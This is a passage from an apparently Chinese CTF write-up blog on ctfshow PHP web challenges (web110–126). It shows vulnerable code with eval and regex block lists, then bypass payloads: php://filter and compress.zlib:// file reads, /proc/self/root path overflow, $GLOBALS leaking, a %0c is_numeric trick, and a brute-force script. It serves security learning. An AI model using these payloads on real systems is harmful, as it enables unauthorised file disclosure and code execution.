class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用 FilesystemIterator 获取指定目录下的所有文件 <a href="http://phpff.com/filesystemiterator">http://phpff.com/filesystemiterator</a> <a href="https://www.php.net/manual/zh/class.filesystemiterator.php">https://www.php.net/manual/zh/class.filesystemiterator.php</a> getcwd()函数 获取当前工作目录 返回当前工作目录<br>payload：<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h1 id="web111-引用变量和-GLOBALS-指针相关"><a href="#web111-引用变量和-GLOBALS-指针相关" class="headerlink" title="web111 引用变量和$GLOBALS 指针相关"></a>web111 引用变量和$GLOBALS 指针相关</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>想要执行getflag函数，那么v1必须为<code>ctfshow</code>，v2赋值为<code>GLOBALS</code>，这里运用到了全局变量。<br>然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag<br>实在没看懂，我们看看以下解释：<br>假设现在有以下两个变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;foo&#x27;</span>;  <span class="comment">// $v1 的值为字符串 &#x27;foo&#x27;</span></span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;bar&#x27;</span>;  <span class="comment">// $v2 的值为字符串 &#x27;bar&#x27;</span></span><br><span class="line"><span class="variable">$bar</span> = <span class="string">&#x27;i am bar&#x27;</span>;</span><br></pre></td></tr></table></figure><p>现在调用 <code>getFlag</code> 函数，并将 <code>$v1</code> 和 <code>$v2</code> 作为引用参数传递给它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>, <span class="variable">$v2</span>);</span><br></pre></td></tr></table></figure><p>在函数内部，<code>&quot;$$v1 = &amp;$$v2;&quot;</code> 这一行代码将把 <code>$v2</code> 的引用赋值给了以 <code>$v1</code> 变量的值 <code>&#39;foo&#39;</code> 作为变量名的新变量。也就是说，在函数执行完毕后，我们得到了另一个变量 <code>$foo</code>，它指向了和 <code>$bar</code> 相同的内存地址。<br>因此，如果我们在调用 <code>getFlag</code> 函数之后输出 <code>$foo</code> 变量的值，应该会得到 <code>$bar</code>的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$foo</span>);  <span class="comment">// 输出 string(8) &quot;i am bar&quot;</span></span><br></pre></td></tr></table></figure><p>测试如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684337748600-cf869928-8df9-4731-ac96-582deef8fea3.png" alt="image.png"><br>PS：byd我最开始还让gpt忽悠了，后来反应过来了，改回来了。再提醒一下，不要忘记编程语言的基础，<code>=</code>是赋值，不是取等！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v1</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;GLOBALS&#x27;</span>;</span><br><span class="line"><span class="variable">$$v1</span> = &amp;<span class="variable">$$v2</span>;</span><br><span class="line"><span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和指针类似，稍微理一下，也就是$a给予了和$GLOBALS相同的超全局变量。最后vardump的是$a。</p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>global和$GLOBALS：<a href="https://www.php.cn/php-weizijiaocheng-369541.html">https://www.php.cn/php-weizijiaocheng-369541.html</a></p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h3 id="考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用"><a href="#考点：php伪协议绕过is-file-highlight-file-对于php伪协议的使用" class="headerlink" title="考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用"></a>考点：php伪协议绕过is_file+highlight_file  对于php伪协议的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接读文件<code>?file=php://filter/resource=flag.php</code><br>除此之外，还有几种特殊的编码方式<br><code>file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code>（这个之前没见过，注意一下）<br><code>file=compress.zlib://flag.php</code><br><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</code></p><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82">https://www.cnblogs.com/meng-han/p/16803560.html#:~:text=ctfshow%20web112%20%28%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87is_file%E5%87%BD%E6%95%B0%29%20%24file%20%3D%20%24_GET%20%5B%20%27file%27,%7D%20else%20%7B%20echo%20%22hacker%21%22%20%3B%20%7D%20%E8%BF%99%E9%87%8C%E7%9A%84is_file%E5%87%BD%E6%95%B0%EF%BC%8C%E5%9C%A8%E4%BD%BF%E7%94%A8php%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%80%99%E4%BC%9A%E8%BF%94%E5%9B%9Efalse%EF%BC%8C%E9%99%A4%E4%BA%86file%3A%2F%2F%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%A4%96%E3%80%82</a></p></blockquote><h3 id="考点：目录溢出"><a href="#考点：目录溢出" class="headerlink" title="考点：目录溢出"></a>考点：目录溢出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?file=compress.zlib://flag.php</code><br>除此之外，有个预期解：<code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code><br>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。<br>原理：is_file函数能处理的长度有限,用/proc/self/root可以目录溢出</p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function <span class="built_in">filter</span>($file)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">echo <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(<span class="built_in">filter</span>($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!&quot;</span>;</span><br></pre></td></tr></table></figure><p>这个直接使用<code>?file=php://filter/resource=flag.php</code>就行</p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><h3 id="考点：trim函数的绕过-is-numeric绕过"><a href="#考点：trim函数的绕过-is-numeric绕过" class="headerlink" title="考点：trim函数的绕过+is_numeric绕过"></a>考点：trim函数的绕过+is_numeric绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function <span class="built_in">filter</span>($num)&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="built_in">filter</span>($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="trim函数"><a href="#trim函数" class="headerlink" title="trim函数"></a>trim函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数        描述</span><br><span class="line">string        必需。规定要检查的字符串。</span><br><span class="line">charlist    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure><p>测试程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123;</span><br><span class="line">$x=<span class="built_in">chr</span>($i).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(trim($x)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  is_numeric($x))&#123;</span><br><span class="line">echo urlencode(<span class="built_in">chr</span>($i)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。<br><code>num=%0c36</code></p><h1 id="web123、web125、web126"><a href="#web123、web125、web126" class="headerlink" title="*web123、web125、web126"></a>*web123、web125、web126</h1><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109181768">https://blog.csdn.net/miuzzx/article/details/109181768</a></p></blockquote><h3 id="考点：php变量不允许出现-传入-代替-SERVER-‘argv’"><a href="#考点：php变量不允许出现-传入-代替-SERVER-‘argv’" class="headerlink" title="考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]"></a>考点：php变量不允许出现. 传入[代替_ $_SERVER[‘argv’]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!isset($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="built_in">eval</span>(<span class="string">&quot;$c&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第一个问题是php变量名是不允许点的使用的：<br>比如可以测试一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br><span class="line"></span><br><span class="line">输入 CTF_SHOW.COM=<span class="number">1</span></span><br><span class="line">返回</span><br><span class="line">array(<span class="number">1</span>) &#123; [<span class="string">&quot;CTF_SHOW_COM&quot;</span>]=&gt; string(<span class="number">1</span>) <span class="string">&quot;1&quot;</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688182650580-e505632b-147a-4bc7-8dbd-d8b01aa593fd.png" alt="image.png"><br>另外有一个知识点，使用<code>[</code>来代替下划线，具体原因未知，爆破脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;=<span class="number">128</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="string">&quot;CTF&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;SHOW&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$j</span>)).<span class="string">&quot;COM&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>,<span class="variable">$data</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.php:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>]))&#123;</span><br><span class="line">    echo <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果<br><code>CTF%5BSHOW.COM=123</code><br>另外</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[<span class="string">&#x27;argv&#x27;</span>][<span class="number">0</span>]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的$_SERVER[‘argv’][<span class="number">0</span>] = $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure><p>因为我们是在网页模式下运行的，所以<code>$_SERVER[&#39;argv&#39;][0] = 